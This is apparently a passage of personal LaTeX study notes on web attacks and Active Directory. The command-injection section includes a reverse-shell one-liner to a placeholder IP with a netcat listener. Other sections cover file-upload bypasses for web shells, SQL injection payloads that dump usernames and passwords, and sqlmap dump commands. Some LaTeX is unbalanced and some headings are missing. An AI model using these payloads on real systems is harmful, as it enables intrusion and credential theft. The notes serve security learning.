\subsubsection*{Command Injection: Examples}

\begin{itemize}
    \item \textbf{Vulnerable Ping Tool}: \texttt{192.168.1.1; whoami}
    \item \textbf{Reverse Shell (Linux)}: Grants interactive terminal on the server.
        \begin{itemize}
            \item \texttt{; bash -i >\& /dev/tcp/<YOUR-IP>/4444 0>\&1}
            \item \textit{(On local:)} \texttt{nc -lvnp 4444}
        \end{itemize}
\end{itemize}

\subsubsection*{Command Injection: Impact and Remediation}

\begin{itemize}
    \item \textbf{\textcolor{red}{What Attackers Can Do}}
        \begin{itemize}
            \item Run any OS command on the web server.
            \item Read sensitive files such as \texttt{/etc/shadow}, config files, source code.
            \item Full interactive reverse shell on the server.
            \item Install backdoors or malware.
            \item Use the server to attack other machines on the internal network.
            \item Rated \textbf{Critical}, indicates full server compromised.
        \end{itemize}
    \item \textbf{\textcolor{green}{Fixes and Mitigations}}
        \begin{itemize}
            \item Never pass user input directly to a shell command.
            \item \textbf{Input Sanitization}: Only allow expected characters with strict input validation.
            \item Use language built-in functions instead of shell commands where possible.
            \item \textit{(Python)}: Use subprocess with a list of arguments and \texttt{shell=False:}.
            \item Run the web server as a low-privilege user so damage is limited if injection does occur.
        \end{itemize}
\end{itemize}

\subsection*{File Upload Attacks}

Attackers can upload malicious files.

\subsubsection*{Web Shells}

Uploaded to web servers to allow attackers to run commands on the server.

\begin{enumerate}
    \item Uploaded file must be saved somewhere the web server can serve it.
    \item Server must execute the file as code rather than just serving it as a download.
\end{enumerate}

For example, Apache servers with PHP enabled will run \texttt{.php} files it receives a request for. Webshells can thus be written in PHP.

\paragraph*{Extension Blacklist Bypass}

Some apps may block the \texttt{.php} extension but not every PHP extension that exists.

\begin{itemize}
    \item Try \texttt{.phtml}, \texttt{.php5}, \texttt{.phar}, \texttt{.shtml}, or \texttt{.pHp}.
    \item Try \textbf{double extensions}: \texttt{shell.php.jpg}
\end{itemize}

\paragraph*{MIME Type Bypass}

\begin{itemize}
    \item Browser sends a \texttt{Content-Type} header indicating file-type: (\texttt{application/x-php}).
    \item Use \textbf{Burp Suite} to catch outgoing request and change \texttt{Content-Type}: (\texttt{image/jpeg})
    \item Server thinks it received a \texttt{.jpeg} but the underlying file is still a PHP script.
\end{itemize}

\paragraph*{Magic Bytes Bypass}

\begin{itemize}
    \item Some servers check the first few bytes of the file to detect its type.
    \item GIF files start with the bytes \texttt{GIF89a}. Append this to the beginning of the PHP script.
    \item File still executes as PHP because PHP ignores start bytes.
\end{itemize}

\subsection*{SQL Injection}

If apps build queries to SQL databases without \textbf{input sanitization} (thus they copy and paste your input verbatim), you can break out of the string by using SQL syntax to change what the query does.

\subsubsection*{SQL Injection: Types}

\begin{itemize}
    \item \textbf{In-band}: Results return directly in the HTTP response. Trivial to exploit
    \item \textbf{UNION-based}: Append an extra \texttt{SELECT} to pull data from other tables
        \begin{enumerate}
            \item Find how many columns the original query returns.
                \begin{itemize}
                    \item \texttt{'ORDER BY 1--} then \texttt{'ORDER BY 2--} keep going until error occurs.
                    \item \texttt{'UNION SELECT username,password FROM users--}: pull data from another table
                \end{itemize}
        \end{enumerate}
    \item \textbf{Error-based}: Trigger database errors that reveal data in the error message
    \item \textbf{Blind}: Database runs query but you cannot see the reuslts in the response
    \item \textbf{Boolean-based}: Ask true/false questions and watch how the response changes
        \begin{enumerate}
            \item \texttt{'AND 1=1--}: gives normal response
            \item \texttt{'AND 1=2--}: gives an empty or different response
            \item This tells you injectoin is working even though you see no data directly.
        \end{enumerate}
    \item \textbf{Time-based}: use \texttt{SLEEP()} to cause delays. A delay means the query ran
\end{itemize}

\subsubsection*{SQL Injection: Application}

\begin{itemize}
    \item \textbf{Simple Login Bypass}
        \begin{itemize}
            \item \textit{Example:} \texttt{SELECT * FROM users WHERE username='admin' AND password='...'}
            \item If we input the username as: \texttt{admin'--}
            \item The \texttt{--} turns everything after it into a comment, effectively bypassing the password check.
        \end{itemize}
    \item \textbf{Extracting Data with \texttt{UNION} (MySQL)}
        \begin{sloppypar}
            \begin{itemize}
                \item \texttt{'UNION SELECT <table\_name>,NULL FROM information\_schema.tables--}
                \item \texttt{'UNION SELECT <column\_name>,NULL FROM information\_schema.columns WHERE table\_name='users'--}
                \item \texttt{'UNION SELECT username,password FROM users--}
            \end{itemize}
        \end{sloppypar}
    \item \textbf{Time-Based Blind Detection}
        \begin{itemize}
            \item \texttt{'AND SLEEP(5)--} \textit{(MySQL)}
            \item \texttt{'; WAITFOR DELAY '0:0:5'--} \textit{(MSSQL)}
            \item If the response takes 5 seconds longer than normal, this injection is confirmed.
        \end{itemize}
    \item \textbf{SQLMap}
        \begin{itemize}
            \item \texttt{sqlmap -u 'https://target.com/page?id=1'}: auto-detect injection
            \item \texttt{sqlmap -u 'https://target.com/page?id=1' --dbs}: list databases
            \item \texttt{sqlmap -u 'https://target.com/page?id=1' -D dbname -T users --dump}: dump a table
        \end{itemize}
\end{itemize}

\subsubsection*{SQL Injection: Impact and Remediation}

\begin{itemize}
    \item \textbf{\textcolor{red}{What Attackers Can Do}}
        \begin{itemize}
            \item Log in as nay user including admins without knowing their password
            \item Dump every username and password hash from database
            \item Read, modify, or delete any data in the database
            \item Run OS commands directly from SQL injection (in some database setups)
        \end{itemize}
    \item \textbf{\textcolor{green}{Fixes and Mitigations}}
        \begin{itemize}
            \item \textbf{Parameterized queries}: completely separate user input from SQL code. \textbf{Sanitize user inputs} to prevent unwanted input to be interpreted as SQL queries.
            \item ORMs such as \textit{SQLAlchemy} or \textit{Django ORM} which automatically parameterize.
            \item Give the database account only the permissions it needs.
        \end{itemize}
\end{itemize}

\part*{10 - Active Directory}

\textbf{Active Directory} is a directory service for Windows network environments.

\begin{itemize}
    \item \textbf{Distributed}, \textbf{hierarchical} structure.
    \item Allows for centralized management of an organization's resources, networks, computers, and users.
    \item Essentially a \textit{sizeable read-only} database accessible to all users within the domain, \textbf{regardless of privilege level}.
        \begin{itemize}
            \item \textbf{ANY} user account, regardless of their privilege level, can enumerate most objects in an AD instance.
        \end{itemize}
    \item Highly scalable.
\end{itemize}

\bigskip

\textit{Active Directory exploitation} remains a key focus for attackers as the many corporations and enterprises run and depend on \textbf{Windows}.

\section*{Active Directory: Terminology}

\begin{itemize}
    \item \textbf{Object}: \textbf{ANY} resource within an \textbf{Active Directory} environment.
        \begin{itemize}
            \item Printers, users, domain controllers, etc.
            \item Courtesy of Windows Fuckershell.
        \end{itemize}
    \item \textbf{Attributes}: Associated set of characteristics applied to an \textbf{object}.
        \begin{itemize}
            \item \textit{Example:} A \textit{computer} \textbf{object} contains \textbf{attributes} such as \texttt{hostname}.
        \end{itemize}
    \item \textbf{Schema}: Blueprint of any enterprise environment.
        \begin{itemize}
            \item Defines what type of \textbf{objects} and their associated \textbf{attributes} can exist in the \textbf{Active Directory} database.
            \item \textit{Example:} User objects belong to the class "\texttt{user}", whereas computer objects belong to the class "\texttt{computer}".
            \item \textbf{Object Instantiation}: Creating a new instance of an object of a class.
            \item It is just \textbf{OOP}.
        \end{itemize}
    \item \textbf{Domain}: Logical group of objects such as \textit{computers}, \textit{users}, \textit{groups}, etc.
        \begin{itemize}
            \item Can operate entirely independently of one another or be connected via \textbf{trust relationships}.
        \end{itemize}
    \item \textbf{Forests}: A collection of \textbf{domains}.
        \begin{itemize}
            \item Can operate entirely independent of one another or be connected via \textbf{trust relationships}.
        \end{itemize}
    \item \textbf{Trees}: A collection of \textbf{domains} that begin at a single \textbf{root domain} and contains all \textbf{subdomains}.
        \begin{itemize}
            \item \textit{Example:} \textbf{Root Domain} (\texttt{ufl.edu}) with \textbf{subdomains} \{\texttt{it.ufl.edu}, \texttt{one.uf.edu}\}
            \item Two trees in the same forest cannot share a name (\textbf{namespace}).
            \item \textbf{Global Catalog}: Shared by all \textbf{domains} in a \textbf{tree}. Contains all information about objects that belong to the tree.
        \end{itemize}
    \item \textbf{Leaf}: \textit{Objects} that do not contain other \textit{objects}, found at the end of the subtree hierarchy.
    \item \textbf{Container}: \textit{Objects} that hold other \textit{objects}.
        \begin{itemize}
            \item Have a defined place in the directory subtree hierarchy.
        \end{itemize}
\end{itemize}

\section*{Global Unique Identifier (GUID)}

A \textbf{GUID} is a unique \texttt{128-bit} value assigned when a domain \textbf{user} or \textbf{group} is created.
\begin{itemize}
    \item Unique across the enterprise.
    \item Every single object created by \textbf{Active Directory} is assigned a \textbf{GUID}; used internally and is \textbf{persistent}.
    \item Stored in the \texttt{ObjectGUID} attribute.
    \item Arguably the \textbf{most accurate} and \textbf{reliable} way to find an exact match for an object.
\end{itemize}

\subsection*{NTDS.DIT}

The \textbf{NTDS.DIT} file can be considered the heart of \textbf{Active Directory}.

\begin{itemize}
    \item A database that stores \textbf{Active Directory} data such as information about user and group objects, group membership, and \textbf{password hashes} for all users in the entire domain.
    \item Stored as a \textbf{Domain Controller} at \texttt{C:\\Windows\\NTDS}.
\end{itemize}

\section*{SAM File}

The \textbf{SAM File} is a local version of the \textbf{Active Directory} database, stored on every \textbf{Windows} system.

\begin{itemize}
    \item Stored at \texttt{C:\\Windows\\System32\\config\\SAM}.
    \item Contains information about local user accounts and their \textbf{encrypted password hashes}.
    \item Once administrative privileges are obtained, pentesters can extract and crack all password hashes.
    \item Usually locked while the system is running, so it cannot be accessed directly without offline access.
\end{itemize}

\section*{SYSTEM Hive}

The \textbf{SYSTEM Hive} is a critical registry file that stores system configuration data.

\begin{itemize}
    \item Stored at \texttt{C:\\Windows\\System32\\config\\SYSTEM}.
    \item Contains the \textbf{Boot Key} (internally as the \texttt{SysKey}). Used to \textbf{encrypt} the \textbf{hashes} stored in the \textbf{SAM File}.
    \item Attackers will almost always attempt to dump both the \textbf{SYSTEM} and \textbf{SAM} files together.
\end{itemize}

\section*{SECURITY Hive}

THe \textbf{SECURITY Hive} is another registry file that contains \textbf{sensitive security-related information} managed by the \textbf{Local Security Authority (LSA)}.

\begin{itemize}
    \item Contains local security policies, cached credentials, and \textbf{LSA Secrets}.
    \item Stored as \texttt{plaintext}.
    \item Penetration testers can gain lateral movement or privilege escalation within a network with access to this file.
\end{itemize}

\subsection*{Security Principals}

\textbf{Security Principals} are anything that the operating system can authenticate.

\begin{itemize}
    \item Users, computer accounts, or even threads/processes that run in the context of a user or computer account.
    \item In \textbf{AD}, \textbf{domain objects} manage access to other resources within the domain.
    \item In a \textbf{local context}, it would be \textbf{SAM} objects. % TODO
\end{itemize}


\subsubsection*{Security Identifier (SID)}

A \textbf{security identifier}, or \textbf{SID}, is used as a unique identifier for a security principal or security group.

\begin{itemize}
    \item Every account, group, or process has its own unique \textbf{SID}.
    \item \textbf{SIDs} can only be generated and used once, and cannot be used to identify another user or group even after a user or group has been deleted.
\end{itemize}

THe user's logon name.

Another way to identify users in \textbf{AD}.

\begin{itemize}
    \item Stored as the \texttt{userPrincipalName} attribute.
    \item Consists of the user account name (\textbf{prefix}) and the domain name (\textbf{suffix}).

\subsection*{Server Principal Name}

The \textbf{server principal name} is an unique identifier for a \textbf{service} running on the \textbf{server}.

\textbf{Group Policy Objects} are \textbf{virtual collections} of policy settings.

\begin{itemize}
    \item Each \textbf{GPO} has a unique \textbf{GUID}.
    \item Applies both at the \textbf{local} and \textbf{domain} context. % TODO

\section*{Access Control Entries}

\textbf{Access Control Entries} identify a \textbf{trustee} (user account, group account, or logon session) and lists the \textbf{access rights} that are \textbf{allowed}, \textbf{denied}, or \textbf{audited}.

\subsection*{Access Control Lists (ACL)}

\textbf{Access Control Lists} are ordered collections of \textbf{Access Control Entries} that apply to an \textbf{object}.

\subsection*{Discretionary Access Control List (DACL)}

\textbf{Discretionary Access Control Lists} define which security principals are \textbf{granted} or \textbf{denied} to an \textbf{object}.

\begin{itemize}
    \item When a process tries to access a \textbf{securable object}, the system checks the \textit{ACEs} in the object's \textbf{DACL} to determine whether or not to grant it access.
    \item \textit{ACEs} are checked linearly until a match is found or access is denied.
    \item \textbf{Object has no \textit{DACL:}} System grants everyone access.
    \item \textbf{Object has \textit{DACL} with no entries:} System denies everyone access.
\end{itemize}
